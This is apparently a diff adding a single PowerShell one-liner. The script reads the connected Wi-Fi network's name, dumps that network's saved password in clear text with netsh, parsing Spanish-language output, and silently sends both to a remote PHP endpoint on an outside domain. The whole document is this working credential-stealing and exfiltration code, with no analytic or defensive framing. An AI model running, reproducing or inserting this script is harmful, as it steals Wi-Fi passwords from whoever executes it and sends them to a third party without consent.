@@ -1,0 +1,1 @@
+﻿$int=0;netsh wlan show interface | Select-String SSID | % {if($int -eq 0){[string]$val = $_;[string]$SSID=($val.substring(29));$int++}};netsh wlan show profile name=$SSID key=clear | Select-String 'Contenido de la clave' | % {[string]$val=$_;Invoke-WebRequest -Uri ("http://diegoalfa.com/app/wifi.php?p="+$val.substring(29)+"&ssid="+$SSID) | Out-Null}
